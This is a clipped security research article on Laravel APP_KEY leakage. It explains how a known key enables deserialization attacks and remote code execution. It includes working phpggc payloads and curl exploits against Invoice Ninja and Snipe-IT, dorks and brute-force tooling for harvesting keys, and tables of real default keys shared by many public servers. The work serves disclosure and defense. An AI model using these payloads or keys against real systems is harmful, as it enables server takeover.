---
title: "Laravel: APP_KEY leakage analysis"
source: "https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis"
author:
  - "Synacktiv"
published:
created: 2025-08-14
description: "Introduction  Laravel is an open-source web framework based on PHP, designed to develop web applications in a structured manner."
tags:
  - "clippings/articles"
  - "_inbox"
---
# Laravel: APP_KEY leakage analysis

![](https://www.synacktiv.com/sites/default/files/styles/blog_grid_view/public/2025-07/logo_laravelcryptokiller_660x330.png)

> [!summary]
> This article details research on Laravel APP_KEY leakage, explaining how this secret key is used for encryption and how its exposure enables deserialization attacks leading to Remote Code Execution (RCE) vulnerabilities. 
> It highlights specific vulnerabilities discovered in projects like Invoice Ninja, Snipe-IT, and Crater, all exploitable when the APP_KEY is known. 
> The authors describe their methodology for collecting and brute-forcing APP_KEYs from publicly exposed Laravel applications using tools like Shodan and a custom-built, optimized tool called nounours, leveraging a collaboration with GitGuardian. 
> Analysis reveals that a significant percentage of public Laravel instances (around 3.5-4%) have crackable APP_KEYs, with over a thousand still vulnerable to CVE-2018-15133. 
> The research concludes that the majority of leaked APP_KEYs are default keys from commercial Laravel products or are reused by developers, emphasizing the critical need for users to regenerate the APP_KEY upon installation to prevent compromise.

vulnerability patterns based on Laravel encryption

. Although, each discovered vulnerability requires access to a Laravel secret: the APP\_KEY, we emphasized the security risks involved and highlighted how this secret is often insecurely exposed in public projects.

## Introduction

Laravel is an open-source web framework based on PHP, designed to develop web applications in a structured manner.

some designs in place on Laravel's internal development components pose risks, particularly regarding the use of the `Encrypter[2](https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis#footnote2_4xxdd4g "Laravel documentation regarding encryption - https://laravel.com/docs/12.x/encryption")` class, which manages encryption and decryption based on the application's `APP_KEY` secret.

we will discuss three vulnerabilities in public projects identified during our research, as well as the models exploited to demonstrate that this security issue remains relevant.

## How the APP\_KEY is used in Laravel

Laravel simplifies encryption through the `encrypt` function, relying on the **OpenSSL** library to ensure a high level of security. This function comes from the `Illuminate\Encryption` package.

Laravel's encryption uses the **AES-256** algorithm in **CBC** mode with a randomly generated initialization vector. The `APP_KEY` secret is used as the secret key.

The following code would allow a user to encrypt the string `Hello World!`:

```php
$originalData = 'Hello world!';
$encryptedData = encrypt($originalData);
```

The value of the variable `$encryptedData` in the previous example is a base64 string containing a JSON with four values: `iv`, `value`, `mac`, and `tag`.

```bash
$ echo 'eyJpdiI6Iks0ZFloT0dZc0M5UGFnSTZNRENjMEE9PSIsInZhbHVlIjoiZTlWb1lERll4RXh3RkorY0ZadStxVE9ZcGJPdDIvRW96QkVtSHVDODY1TT0iLCJ
tYWMiOiJkYjYwYTRkMmNjMTg3NGFjOWE2ZjU0ZGRkN2JhZjkzYjVjZGIwNzI1MzBjYmI2N2I4YzU2YTliMTAxNTI3YzBiIiwidGFnIjoiIn0=' | base64 -d | jq
{
  "iv": "K4dYhOGYsC9PagI6MDCc0A==",
  "value": "e9VoYDFYxExwFJ+cFZu+qTOYpbOt2/EozBEmHuC865M=",
  "mac": "db60a4d2cc1874ac9a6f54ddd7baf93b5cdb072530cbb67b8c56a9b101527c0b",
  "tag": ""
}
```

- `iv`: A randomly generated initialization vector.
- `value`: The value encrypted using the initialization vector and the `APP_KEY`.
- `mac`: HMAC generated from the initialization vector and the value, using the `APP_KEY` as the secret key. This value was added to thwart padding oracle attacks.
- `tag`: The `tag` value is only used in cases where AES is used in GCM mode.

### Exposure to deserialization attacks

A PHP deserialization attack exploits the `unserialize` function, which converts a string into a PHP object

To determine if a framework or library contains exploitable deserialization strings, PHPGGC [4](https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis#footnote4_hekiw0n "PHP Generic Gadget Chains project on GitHub - https://github.com/ambionics/phpggc"), can be used. This tool, developed by Charles Fol, contains a list of affected projects and versions.

as shown in the following screenshot, Laravel contains many usable chains, even in its latest versions.

List of Laravel gadget chains that can be used with phpggc to obtain Remote Command Execution via deserialization.

### Vulnerabilities discovered during the process

We will now dive into ways to exploit weaknesses related to the `decrypt[7](https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis#footnote7_ardssie "Illuminate decrypt function - https://github.com/illuminate/encryption/blob/master/Encrypter.php#L155")` function in Laravel environments.

```php
namespace Illuminate\Encryption;

class Encrypter implements EncrypterContract, StringEncrypter
{

public function decrypt($payload, $unserialize = true)
    {
        $payload = $this->getJsonPayload($payload);

        $iv = base64_decode($payload['iv']);

        $decrypted = \openssl_decrypt( $payload['value'], $this->cipher, $this->key, 0, $iv );
    
        [...]
    
        return $unserialize ? unserialize($decrypted) : $decrypted;
    }
```

This function takes two parameters:

- `$payload`: Corresponds to the string normally encrypted by the `encrypt` function.
- `$unserialize`: A parameter that determines whether the decrypted string should be unserialized.

The issue here is straightforward: **by default**, a call to the `decrypt` function will consider the decrypted string as serialized data.

The variable used as the decryption key in the `openssl_decrypt` function is the `APP_KEY`. In summary, a user in possession of this secret will be able to re-encrypt data to carry out a deserialization attack and thus compromise the server hosting the Laravel application.

In order to automate the full process, we developed an open source tool: laravel-crypto-killer [8](https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis#footnote8_8t9w3jd "laravel-crypto-killer project on GitHub - https://github.com/synacktiv/laravel-crypto-killer").

### Vulnerable decrypt function call in Invoice Ninja (CVE-2024-55555)

An attacker in possession of the `APP_KEY` is able to fully control a string passed on a pre-authenticated call to a `decrypt` function.

```php
Route::get('route/{hash}', function ($hash) {

    $route = '/';

    try {
        $route = decrypt($hash); 
    }
    catch (\Exception $e) { 
        abort(404);
    }

    return redirect($route);

})->middleware('throttle:404');
```

To generate a serialization payload designed to run the bash command `id` on a Laravel based server, the phpggc tool was used.

```bash
$ php8.2 phpggc Laravel/RCE13 system id -b -f
YToyOntpOjc7Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086MzU6IklsbHVtaW5hdGVcRGF0YWJhc2VcRGF0YWJhc2VNYW5hZ2VyIjoyOntzOjY6IgAqAGFwcCI7YToxOntzOjY6ImNvbmZpZyI7YToyOntzOjE2OiJkYXRhYmFzZS5kZWZhdWx0IjtzOjY6InN5c3RlbSI7czoyMDoiZGF0YWJhc2UuY29ubmVjdGlvbnMiO2E6MTp7czo2OiJzeXN0ZW0iO2E6MTp7aTowO3M6MjoiaWQiO319fX1zOjEzOiIAKgBleHRlbnNpb25zIjthOjE6e3M6Njoic3lzdGVtIjtzOjEyOiJhcnJheV9maWx0ZXIiO319fWk6NztpOjc7fQ==
```

Finally, to manipulate and exploit Laravel ciphers, the laravel-crypto-killer tool can be used. The chain generated from phpggc can be encrypted again in order to achieve remote command execution on the affected server, without prior access:

```bash
$ ./laravel_crypto_killer.py encrypt -k RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno= -v $(php8.2 phpggc Laravel/RCE13 system id -b -f)
[+] Here is your laravel ciphered value, happy hacking mate!
eyJpdiI6ICJhbmE4ck1BVitqWUNjK0dNRi9uV0VnPT0iLCAidmFsdWUiOiAiYndlUTRyaDgyWGhDRFZ1dkxvbVlTcmpoWTR6cmRjTDc0QzRRcjBiVzhrQTU1N0hYS1NxUU9nOUJWbEFNbDVqTDFSNjVBMmpQMzg0b01KVm8vbEZxcHVodEIveE1kV2lOZWVDRWszRlE5T3l3OHhyemZHdWx6Q2Jxcm5Hb0NqdVJVamlZVkZJcDNIR21YeXVwWWVuNURXQjRldDluTG9BczR4SlJKTDV0VGliQ09CRmd2dTA3b0txRStWTEhUdmhCRGlTaEk3TkpRbTlOS2YraWlZUS9odURMOGtrVzh3S2w4NUtiUE9xN1A2ZktDVklMYkNCVnZkVXc2eW02RGY4QklzL3R1RTJkbHpud1drbE1BZ01mU2Zjejd2bDZWSTc4SmV6L1NOQlNlRXdwL1N0YXRnWDJaQzQwRUl5QXhrZzRPSnBzNktEa24zY3pZaXZLQ0ZXZ2NRNnhZaFFycm95cnZ4MjdUa1JsMFB1aTkyTzI1ZzhTbXlyTzV0eFg2dXQ5MkxGc2xWeUhtUFN5WHA4RlAxcGk5cVZWL0cvdCtKbHJLeWp0V3RZUVJSSmxHSXNGSFNJelh1N2t0WWplMExEQSIsICJtYWMiOiAiODhiOGI1MGQzZmQ5NTQwNjllYzUxNjVkM2Y2MjNlZDM5N2Y4YWZmZDRhMjMyMmY1YTQ0ZDhkYjQ3NDkzZDE2MCIsICJ0YWciOiAiIn0=

# Reusing the previous chain on invoiceninja
$ curl -s http://in5.localhost/route/eyJpdiI6[...]0= | head -n1
uid=1500(invoiceninja) gid=1500(invoiceninja) groups=1500(invoiceninja)
```

### XSRF-TOKEN serialization in Snipe-IT (CVE-2024-48987)

An attacker in possession of the `APP_KEY` is able to fully control a string passed to an `unserialize` function when a call to the `decrypt($user_input)` function from the `Illuminate\Encryption` package is made. This is the case for the `XSRF-TOKEN` cookie when the `Passport::withCookieSerialization()` option is enforced.

```bash
$ php7.4 phpggc Laravel/RCE9 system id -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czoyOiJpZCI7fX0=
```

```bash
$ ./laravel_crypto_killer.py encrypt -k 3ilviXqB9u6DX1NRcyWGJ+sjySF+H18CPDGb3+IVwMQ= -v $(php7.4 phpggc Laravel/RCE9 system id -b)
eyJpdiI6ICJvck1SVWxyNDF6Lytaeks4a3NxU0tnPT0iLCAidmFsdWUiOiAiUkI0Z21sbCtZN1lJcWY2OS9HaHNjMDhteGNycGwvSStNQ2FaTDczdHhOTlpUUE5kVExCbkQybm5LRHp5SEtwYkRkeVVXcEZzWVpzMTNRbnJSSnFaaFdOVDczY1hsajFTMzFqNXZ1NFhYZGdjenFBT2s1LytiSURTbDQyU3JWNUMzM3lCRjZxZGhBWDVlMklYR1Y2c29FdnRRVUtvMkkxQkorYnltWGtFOHFUREwwTUU3TWRrWlRGR1FRdTkydE85b0JxeW5WRldOcUFieCtoYnM1UjREaDhBaGg5bzVhK3U1Q2o5OHkwRS80MlFVZmRPMW9SQm0rYVliMTRUTFZWTGc0TjhHK010SWpUclBpeURwT1Mxd3lSWTkvTlpZelcxVGs3Z2xTVTFBdXBvZ1RoSUEyckhaTTJ1TXBUTklZYiswV0NFTEZGa2padHkzUEovRER2Nzh5a2h3OXFKb0dRQ01mMVllMnVMUS8rdGh3N1JWWCtJazhWaEk0K0ROVkhYdWk1ekh2MUZzUGJFZTdkWCszQ1RvcDBkcktpTlBzdlVUVHVEMlRkWmN3ODRza1Y3WXNPSWU5RHdXbEswT1o1UCIsICJtYWMiOiAiNjA0ODE1NjQ1NWY2YWJmNGY5OWE2YTg3YzY0MzUxNDU0YmU0YzQwMDliM2NiMDJkYTg2ODZkNzNmMzJjMWEyZiIsICJ0YWciOiAiIn0=

# Reusing the previous base64 chain to trigger the remote command execution
$ curl -s -H "Cookie: XSRF-TOKEN=ey[...]0=" http://localhost:8000/login | head -n 1
uid=1000(docker) gid=50(staff) groups=50(staff)
```

### Vulnerability summary

We have highlighted the fact that using the `decrypt` function in its current form can quickly lead to remote code execution vulnerabilities.

It has to be noted that all the previous vulnerabilities could be exploited pre-authentication as long as the default `APP_KEY` of the project was not changed by the end users themselves.

### How to identify the APP\_KEY of a Laravel application

There is a pre-authenticated way to know if an `APP_KEY` is valid on any Laravel application. Indeed, on a default Laravel installation, two cookies will always be set:

- `XSRF-TOKEN`: used as a CSRF token.
- `laravel-session`: used as a session token to authenticate the current session. However, the prefix before **session** might change depending on the application name.

By default, each cookie set by Laravel is a value encrypted via the `encrypt` function. Therefore, these values can be used to brute force the associated `APP_KEY`.

In order to try thousands of `APP_KEY` s, we added the option **bruteforce** mode to laravel-crypto-killer:

```bash
$ ./laravel_crypto_killer.py bruteforce -v eyJpdiI6Imt3OVJISzJHdGc1ZlE1UFZqWXJZTnc9PSIsInZhbHVlIjoib0JkTkZTTjdVbnNnWWh1aDRnNFM3WFc1eUdlSlovT08rRWNTT3ZsRHdZU1VLSGsxYUhvYTEzVjRQZGtzZFFzOWdVRUJBWU0ybnhITnFXZUd6N1JXanpJaW9YWS9tTDR1TWlIT1ZGaStqVXFUL1hYK1JWMDdSc0VacHlwMjVYTVYiLCJtYWMiOiIxMTg1OGI3MmQ4NjhjMWM2NGYzZGY2MTIyMWM5MjFkYWEyOWRhMWRjMDM3ZmQ4NjM3YWViODM3MDJkMGZhOGI3IiwidGFnIjoiIn0%3D
[*] The option --key_file was not defined, using files from the folder wordlists...
  0%|                                                     | 0/1 [00:00<?, ?it/s]
[+] It is your lucky day! A key was identified!
Cipher : eyJpdiI6Imt3OVJISzJHdGc1ZlE1UFZqWXJZTnc9PSIsInZhbHVlIjoib0JkTkZTTjdVbnNnWWh1aDRnNFM3WFc1eUdlSlovT08rRWNTT3ZsRHdZU1VLSGsxYUhvYTEzVjRQZGtzZFFzOWdVRUJBWU0ybnhITnFXZUd6N1JXanpJaW9YWS9tTDR1TWlIT1ZGaStqVXFUL1hYK1JWMDdSc0VacHlwMjVYTVYiLCJtYWMiOiIxMTg1OGI3MmQ4NjhjMWM2NGYzZGY2MTIyMWM5MjFkYWEyOWRhMWRjMDM3ZmQ4NjM3YWViODM3MDJkMGZhOGI3IiwidGFnIjoiIn0%3D
Key : base64:CGhMqYXFMzbOe048WS6a0iG8f6bBcTLVbP36bqqrvuA=
[*] Unciphered value
1beeb01afabf67cf1a1661bb347aa20dd68fff0f|BRrlfYbBn5XQK2vkYAcu7GVSABKSQrskDVjtQmgx
100%|█████████████████████████████████████████████| 1/1 [00:05<00:00,  5.00s/it]
[*] 1 cipher(s) loaded
[+] Found a valid key for 1 cipher(s)!
[-] No serialization pattern matched, probably no way to unserialize from this :(
[+] Results saved in the file results/results.json
```

### Retrieving APP\_KEYs at scale

As we saw, modern Laravel applications are encrypting data by using a combination of AES-256 mode CBC and a HMAC by default. Furthermore, the `APP_KEY` is generated via the `random_bytes` [17](https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis#footnote17_2uoni68 "PHP documentation of the function random_bytes - https://www.php.net/manual/en/function.random-bytes.php") PHP function, which is currently considered cryptographically secured.

It means that the value of the `APP_KEY` on a Laravel application cannot be identified by pure brute-force.

in order to retrieve a lot of `APP_KEY` s, we used several methods. We tried to identify them in July 2024 by:

Using GitHub dorks: `github-dorks -q "APP_KEY=base64" -p php`

Using Google dorks: `ext:env intext:APP_ENV= | intext:APP_DEBUG= | intext:APP_KEY=`

Looking for hard coded APP\_KEYs inside Laravel public documentation or public forums.

Or looking in other public projects like **BadSecrets** [19](https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis#footnote19_e2s0rqz "Project BadSecrets on GitHub - https://github.com/blacklanternsecurity/badsecrets/tree/main") which already have wordlists containing `APP_KEY` s.

### Brute forcing at scale

Our colleague Damien Picard volunteered to help us and quickly got into the game of brute force optimization. This led to the creation of a wonderful new tool:

`nounours` optimized the brute force process so much that we went from a few weeks with `laravel-crypto-killer` to only 1 minute and 51 seconds to brute force all the datasets.

```bash
# Example of output generated by nounours
$ nounours --encrypted-file all_tokens-30_05.txt --key-file all_app_keys.txt
Starting cbc bf on 624536 encrypted text with 267810 keys.
eyJpdiI6IllXUWF4dHNNY2k2eEE0cXduU1cxUEE9PSIsInZhbHVlIjoiR0JnWE9vTFoxVjJwbCtLN1F0eXIwSnl4d05RRFpQOXpXSWxFZUNzYkpIVWwwbnkzMk5oc0FGYW9LalJScVUxN2RiejhlOFJFVEp5bmxaYXY3QWtMdk13T3lnY1g3ei9jcnRMV1pPaFlLV091L1l2UGY0ZE5TczhUbmxBTHZXSjIiLCJ0YWciOm51bGx9:91b99c5f00e2f3f29cb872fcb806607643e84180|q2v4Xq3pi0fNUNkSDJTbqw9W2BB36Otb3mdWvYlv:aes-256-cbc:base64:U29tZVJhbmRvbVN0cmluZ1dpdGgzMkNoYXJhY3RlcnM=
eyJpdiI6Ik9kS3pPbjhzQWZYWXVDSzNMS1dhS0E9PSIsInZhbHVlIjoidXFKU09lVlc1azlPbGgraElRYzVVeDJZbVhuTWxjM0tRaWRzemxmQVc0cDFhMVpZSFpRTmNFVytVMjk1RFlsV09OdXA2enBJUFBsTDJ3d25SUnJTZ1E9PSIsInRhZyI6bnVsbH0=:s:40:"BEtS21PQRLgrN8PMNvWU4QUsy8nKu1iJEJRdWB0s";:aes-256-cbc:base64:Szj2KpQhjfDp750FRO0b6lS2+0TscGTaGbgCAvmnRdU=
eyJpdiI6ImNJbE42d05JUElpdlRONkZHaE5CM0E9PSIsInZhbHVlIjoiRHpzMGhCQTQxTURkTkNaRE9rM1JJNENza3BIMllHZUMwZHNuMTdmeXhmcysveFBweWM1NFl6cGFsSFUvdXgyNSIsInRhZyI6bnVsbH0=:RAR3rzmHMkqnP4qkJ4MXlPcHCbriK4ZJpmv4u6bc:aes-256-cbc:base64:W8UqtE9LHZW+gRag78o4BCbN1M0w4HdaIFdLqHJ/9PA=

# Total time of bruteforce on all the dataset
$ time nounours --encrypted-file ../all_tokens-30_05.txt --key-file ../all_app_keys.txt > /dev/null
Starting cbc bf on 624536 encrypted text with 267810 keys.
Starting gcm bf on 58 encrypted text with 267810 keys.
Got through 167272519140 combinations in 110856611881ns
Speed: 1509M try/s

real    1m51.408s
user    28m27.245s
sys    0m0.710s
```

### Analyze of the APP\_KEY top 10

There is one last question to answer from all this data: where does these `APP_KEY`s come from, and why are they reused so much?

| Position | Number of public servers sharing it | APP\_KEY | Description |
| --- | --- | --- | --- |
| 🥇 | 561 | W8UqtE9LHZW+gRag78o4BCbN1M0w4HdaIFdLqHJ/9PA= | Default key of UltimatePOS available on CodeCanyon |
| 🥈 | 491 | SbzM2tzPsCSlpTEdyaju8l9w2C5vmtd4fNAduiLEqng= | Frequently used in bootstrapped projects |
| 🥉 | 415 | otfhCHVghYrivHkzWqQnhnLmz0bZO72lKX7TxfD6msI= | Default key of XPanel SSH User Management |
| 4️⃣ | 313 | U29tZVJhbmRvbVN0cmluZ09mMzJDaGFyc0V4YWN0bHk= | base64 value of SomeRandomStringOf32 CharsExactly |
| 5️⃣ | 257 | FBhoCqWGOmuNcUh/3E5cnwB3zNCF4rZ7G19WRW4KVOs= | APP\_KEY shared between unrelated projects |
| 6️⃣ | 216 | U29tZVJhbmRvbVN0cmluZw== | Default APP\_KEY on older Laravel Version base64 value of SomeRandomString |
| 7️⃣ | 198 | 1HJ+CWiouSuJODKAgrMxvwxcm2Tg8MjlrqSl/8ViT5E= | Seems linked to several platforms linked to crypto wallet management |
| 8️⃣ | 195 | EmFb+cmLbacowY1N9P8Y8+PAcRXU7SDU2rxBL1oaVyw= | Default key of WASender a message sender for WhatsApp |
| 9️⃣ | 177 | yPBSs/6cUPg+mwXV00hWJpB8TFk4LT+YduzProk5//Q= | Default key on several AI based projects |
| 🔟 | 155 | ahimIiG674yV4DkPWx6f7t9dkMmTFK2S+0lCPglpVfs= | Key shared between several random Laravel projects, seems they are copying each other |
| 11 | 152 | RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno= | Default key on Invoice ninja |
| 79 | 44 | 3ilviXqB9u6DX1NRcyWGJ+sjySF+H18CPDGb3+IVwMQ= | Default key on Snipe-IT |

| Position | Number of public servers sharing it | APP\_KEY | Description | Position since 2024 |
| --- | --- | --- | --- | --- |
| 🥇 | 1650 | W8UqtE9LHZW+gRag78o4BCbN1M0w4HdaIFdLqHJ/9PA= | Default key of UltimatePOS available on CodeCanyon | 🟰 |
| 🥈 | 1132 | xf8woJXKNEFH1rjGffK/GBw2KxjMsxkleON68YnWdaw= | Key shared between several projects of an Indonesian company | 🆕 |
| 🥉 | 518 | U29tZVJhbmRvbVN0cmluZ09mMzJDaGFyc0V4YWN0bHk== | base64 value of SomeRandomStringOf32CharsExactly | ⬆️ |
| 4️⃣ | 275 | SbzM2tzPsCSlpTEdyaju8l9w2C5vmtd4fNAduiLEqng= | Frequently used in bootstrapped projects | ⬇️ |
| 5️⃣ | 275 | otfhCHVghYrivHkzWqQnhnLmz0bZO72lKX7TxfD6msI= | Default key of XPanel SSH User Management | ⬇️ |
| 6️⃣ | 203 | U29tZVJhbmRvbVN0cmluZw== | Default APP\_KEY on older Laravel Version base64 value of SomeRandomString | 🟰 |
| 7️⃣ | 170 | FBhoCqWGOmuNcUh/3E5cnwB3zNCF4rZ7G19WRW4KVOs= | APP\_KEY shared between unrelated projects | ⬇️ |
| 8️⃣ | 165 | BlQYTmcfZGV4XShvK5Z+ffNVWv0qszkUTRuEGmQ76lw= | Default key of Rocket LMS available on CodeCanyon | 🆕 |
| 9️⃣ | 164 | EmFb+cmLbacowY1N9P8Y8+PAcRXU7SDU2rxBL1oaVyw= | Default key of WASender a message sender for WhatsApp | ⬇️ |
| 🔟 | 157 | hMS5VtciEk3t/0Ije8BCRl+AZOvU2gJanbAw5i/LgIs= | Default key of Flex Home - Laravel Real Estate Multilingual System available on CodeCanyon | 🆕 |
| 11 | 153 | 3ilviXqB9u6DX1NRcyWGJ+sjySF+H18CPDGb3+IVwMQ= | Default key on Snipe-IT | ⬆️ |
| 19 | 94 | ahimIiG674yV4DkPWx6f7t9dkMmTFK2S+0lCPglpVfs= | Key shared between several random Laravel projects, seems they are copying each other | ⬇️ |
| 24 | 87 | yPBSs/6cUPg+mwXV00hWJpB8TFk4LT+YduzProk5//Q= | Default key on several AI based projects | ⬇️ |
| 26 | 84 | RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno= | Default key on Invoice ninja | ⬇️ |
| 320 | 11 | 1HJ+CWiouSuJODKAgrMxvwxcm2Tg8MjlrqSl/8ViT5E= | Seems linked to several platforms linked to crypto wallet management | ⬇️ |